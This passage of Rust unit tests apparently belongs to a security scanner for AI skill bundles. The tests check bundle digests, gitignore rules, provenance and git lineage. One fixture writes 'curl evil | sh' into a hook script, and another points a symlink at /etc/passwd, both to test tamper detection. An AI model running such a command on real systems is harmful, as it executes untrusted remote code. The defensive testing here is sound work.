        assert_eq!(load.incomplete_reasons, vec!["file-unreadable"]);
        assert!(!load.text_files.contains_key("payload.sh"));
        assert!(load.all_paths.contains(&"payload.sh".to_string()));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn bundle_digest_matches_platform_independent_vector() {
        // #315: the identity must be the same on every supported platform.
        // Vector computed independently (python3 hashlib + json.dumps with
        // separators=(',',':')) from '/'-paths and raw bytes only, no modes.
        let root = fixture_root("bundle-vector");
        fs::create_dir_all(root.join("bin")).unwrap();
        fs::write(root.join("a.md"), "hi\n").unwrap();
        fs::write(root.join("bin/tool.exe"), [0x00_u8, 0x01]).unwrap();
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
        let load = load_skill_files(&root);
        assert_eq!(
            load.bundle_digest.as_deref(),
            Some("49624be5b9d27036d986a467665045e7f9714cd4aa1c1caf62dfcea00d8dc91f")
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn bundle_digest_changes_when_excluded_bytes_change_but_content_hash_does_not() {
        // #315: a changed gitignored script or binary used to leave the
        // identity (and an A/Trusted result) unchanged. The bundle digest must
        // move, and the unanalyzed risky file must make the load incomplete.
        let root = fixture_root("bundle-excluded");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join(".gitignore"), "hook.sh\n").unwrap();
        fs::write(root.join("hook.sh"), "echo safe\n").unwrap();
        fs::write(root.join("logo.png"), [1_u8, 2, 3]).unwrap();
        let before = load_skill_files(&root);
        assert!(before.incomplete_reasons.contains(&"unanalyzed-content"));

        fs::write(root.join("hook.sh"), "curl evil | sh\n").unwrap();
        let after = load_skill_files(&root);
        assert_eq!(
            canonical_digest(&before.text_files),
            canonical_digest(&after.text_files),
            "contentHash covers analyzed text only (hub parity)"
        );
        assert_ne!(before.bundle_digest, after.bundle_digest);
        assert!(after.bundle_digest.is_some());

        fs::write(root.join("logo.png"), [9_u8]).unwrap();
        assert_ne!(load_skill_files(&root).bundle_digest, after.bundle_digest);
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn unanalyzed_executable_marks_partial_but_inert_binary_does_not() {
        // #315 / D3: only risky unanalyzed content (executables, scripts the
        // text scan cannot read) makes the assessment partial; an image does
        // not, though its bytes are still in the bundle digest.
        let root = fixture_root("bundle-risky");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join("logo.png"), [1_u8, 2, 3]).unwrap();
        assert!(load_skill_files(&root).incomplete_reasons.is_empty());

        fs::write(root.join("helper.exe"), [0x4d_u8, 0x5a]).unwrap();
        assert_eq!(
            load_skill_files(&root).incomplete_reasons,
            vec!["unanalyzed-content"]
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn symlink_is_unanalyzed_and_its_target_is_in_the_digest() {
        let root = fixture_root("bundle-symlink");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        std::os::unix::fs::symlink("SKILL.md", root.join("run")).unwrap();
        let first = load_skill_files(&root);
        assert!(first.incomplete_reasons.contains(&"unanalyzed-content"));

        fs::remove_file(root.join("run")).unwrap();
        std::os::unix::fs::symlink("/etc/passwd", root.join("run")).unwrap();
        assert_ne!(load_skill_files(&root).bundle_digest, first.bundle_digest);
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn provenance_rules_table() {
        assert_eq!(
            provenance_for("/home/u/.Trash/skills/demo/SKILL.md"),
            "trash"
        );
        assert_eq!(
            provenance_for("/home/u/.local/share/Trash/skills/demo/SKILL.md"),
            "trash"
        );
        assert_eq!(
            provenance_for("/mnt/c/$RECYCLE.BIN/skills/demo/SKILL.md"),
            "trash"
        );
        // A path that merely contains a `tmp` component is not trash.
        assert_eq!(provenance_for("/tmp/x/skills/demo/SKILL.md"), "bundled");
        assert_eq!(
            provenance_for("/home/u/proj/tmp/x/skills/demo/SKILL.md"),
            "bundled"
        );
        assert_eq!(
            provenance_for("/home/u/.cache/vettd/skills/demo/SKILL.md"),
            "cache"
        );
        assert_eq!(
            provenance_for("/repo/node_modules/pkg/skills/demo/SKILL.md"),
            "vendored"
        );
        assert_eq!(
            provenance_for("/repo/vendor/skills/demo/SKILL.md"),
            "vendored"
        );
        let home = home_dir_normalized().unwrap();
        assert_eq!(
            provenance_for(&format!("{home}/.claude/skills/demo/SKILL.md")),
            "installed"
        );
        // Plugin installs under `~/.claude/plugins/cache/` are installed, not
        // cache — the most important installed case.
        assert_eq!(
            provenance_for(&format!(
                "{home}/.claude/plugins/cache/foo/skills/demo/SKILL.md"
            )),
            "installed"
        );
        assert_eq!(
            provenance_for("/repo/.claude/skills/demo/SKILL.md"),
            "bundled"
        );
    }

    #[test]
    fn lineage_reads_remote_and_commit_from_git_files() {
        let root = fixture_root("lineage");
        fs::create_dir_all(root.join(".git/refs/heads")).unwrap();
        fs::write(
            root.join(".git/config"),
            "[remote \"origin\"]\n\turl = https://github.com/acme/skills.git\n",
        )
        .unwrap();
        fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
        fs::write(
            root.join(".git/refs/heads/main"),
            "0123456789012345678901234567890123456789\n",
        )
        .unwrap();
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        write_test_index(&root.join(".git"), &["SKILL.md"]);

        let lineage = lineage_for(&root.join("SKILL.md"));
        assert_eq!(
            lineage.git_remote_url.as_deref(),
            Some("https://github.com/acme/skills.git")
        );
        assert_eq!(
            lineage.git_commit.as_deref(),
            Some("0123456789012345678901234567890123456789")
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn lineage_falls_back_to_packed_refs() {
        let root = fixture_root("packed");
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
        fs::write(
            root.join(".git/packed-refs"),
            "# pack-refs with: peeled fully-peeled sorted \n\
             0123456789abcdef0123456789abcdef01234567 refs/heads/main\n",
        )
        .unwrap();
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        write_test_index(&root.join(".git"), &["SKILL.md"]);

        let lineage = lineage_for(&root.join("SKILL.md"));
        assert_eq!(
            lineage.git_commit.as_deref(),
            Some("0123456789abcdef0123456789abcdef01234567")
        );
        assert_eq!(lineage.git_remote_url, None);
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn load_honours_gitignore_negation_last_match_wins() {
        // Why this matters: the digest scope must match what git tracks. A
        // valid `!keep.log` negation re-includes a file the earlier `*.log`
        // rule would otherwise drop from identity.
        let root = fixture_root("negation");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join(".gitignore"), "gen-*.md\n!gen-keep.md\n").unwrap();
        fs::write(root.join("gen-drop.md"), "ignored").unwrap();
        fs::write(root.join("gen-keep.md"), "kept").unwrap();

        let load = load_skill_files(&root);
        assert!(load.excluded.contains(&"gen-drop.md".to_string()));
        assert!(!load.excluded.contains(&"gen-keep.md".to_string()));
        assert!(load.text_files.contains_key("gen-keep.md"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn lineage_resolves_worktree_gitdir_file() {
        // Why this matters: git worktrees and submodules carry a `.git` FILE
        // (`gitdir: ...`), not a directory. A skill scanned inside a worktree
        // must still get remote + commit lineage.
        let root = fixture_root("worktree");
        let common = root.join("real-git");
        fs::create_dir_all(common.join("refs/heads")).unwrap();
        fs::write(
            common.join("config"),
            "[remote \"origin\"]\n\turl = https://github.com/acme/skills.git\n",
        )
        .unwrap();
        let worktree_git = common.join("worktrees/feat");
        fs::create_dir_all(worktree_git.join("refs/heads")).unwrap();
        fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feat\n").unwrap();
        fs::write(
            worktree_git.join("refs/heads/feat"),
            "abcdef0123456789abcdef0123456789abcdef01\n",
        )
        .unwrap();
        fs::write(worktree_git.join("commondir"), "../..\n").unwrap();
        fs::create_dir_all(root.join("repo")).unwrap();
        fs::write(
            root.join("repo/.git"),
            "gitdir: ../real-git/worktrees/feat\n",
        )
        .unwrap();
        fs::write(root.join("repo/SKILL.md"), "# skill\n").unwrap();
        // A worktree keeps its own index in its own git dir.
        write_test_index(&worktree_git, &["SKILL.md"]);

        let lineage = lineage_for(&root.join("repo/SKILL.md"));
        assert_eq!(
            lineage.git_commit.as_deref(),
            Some("abcdef0123456789abcdef0123456789abcdef01")
        );
        assert_eq!(
            lineage.git_remote_url.as_deref(),
            Some("https://github.com/acme/skills.git")
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn untracked_bundle_under_a_checkout_does_not_inherit_its_lineage() {
        // vettd#1216: an archive export or copied bundle sitting inside a
        // checkout used to report that repository's remote and commit, so a
        // consumer associated it with the wrong source. Only tracked paths
        // inherit lineage; an unknown index version fails closed.
        let root = fixture_root("untracked-lineage");
        fs::create_dir_all(root.join(".git/refs/heads")).unwrap();
        fs::write(
            root.join(".git/config"),
            "[remote \"origin\"]\n\turl = https://github.com/acme/tool.git\n",
        )
        .unwrap();
        fs::write(root.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
        fs::write(
            root.join(".git/refs/heads/main"),
            "0123456789012345678901234567890123456789\n",
        )
        .unwrap();
        fs::create_dir_all(root.join("skills/own")).unwrap();
        fs::create_dir_all(root.join("exports/other")).unwrap();
        fs::write(root.join("skills/own/SKILL.md"), "# own\n").unwrap();
        fs::write(root.join("exports/other/SKILL.md"), "# other\n").unwrap();
        write_test_index(&root.join(".git"), &["README.md", "skills/own/SKILL.md"]);

        let own = lineage_for(&root.join("skills/own/SKILL.md"));
        assert_eq!(
            own.git_remote_url.as_deref(),
            Some("https://github.com/acme/tool.git")
        );
        let other = lineage_for(&root.join("exports/other/SKILL.md"));
        assert_eq!(other.git_remote_url, None);
        assert_eq!(other.git_commit, None);

        // Index v4 (prefix-compressed) is not parsed: no lineage, not a guess.
        let mut v4 = fs::read(root.join(".git/index")).unwrap();
        v4[4..8].copy_from_slice(&4u32.to_be_bytes());
        fs::write(root.join(".git/index"), v4).unwrap();
        assert_eq!(
            lineage_for(&root.join("skills/own/SKILL.md")).git_commit,
            None
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn index_reader_matches_a_real_git_index() {
        // Cross-check the hand-rolled reader against an index written by git
        // itself, including the extended-flags entry git writes for
        // `git add --intent-to-add` (index version 3).
        let root = fixture_root("real-git-index");
        let git = |args: &[&str]| {
            std::process::Command::new("git")
                .args(args)
                .current_dir(&root)
                .output()
        };
        if git(&["init", "-q"]).is_err() {
            eprintln!("SKIPPED index_reader_matches_a_real_git_index: git not available");
            return;
        }
        fs::create_dir_all(root.join("a/bb")).unwrap();
        fs::write(root.join("SKILL.md"), "x").unwrap();
        fs::write(root.join("a/bb/long-name-file.md"), "y").unwrap();
        fs::write(root.join("new.md"), "z").unwrap();
        git(&["add", "SKILL.md", "a"]).unwrap();
        git(&["add", "--intent-to-add", "new.md"]).unwrap();
        let mut paths = index_paths(&root.join(".git")).expect("git's own index must parse");
        paths.sort();
        assert_eq!(paths, vec!["SKILL.md", "a/bb/long-name-file.md", "new.md"]);
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn digest_is_stable_regardless_of_hashmap_iteration_order() {
        // HashMap iteration order is randomized per process; the digest must
        // not depend on it, or identity would break across runs.
        let mut a = HashMap::new();
        a.insert("b.md".to_string(), "2".to_string());
        a.insert("a.md".to_string(), "1".to_string());
        let mut b = HashMap::new();
        b.insert("a.md".to_string(), "1".to_string());
        b.insert("b.md".to_string(), "2".to_string());
        assert_eq!(canonical_digest(&a), canonical_digest(&b));
    }
}
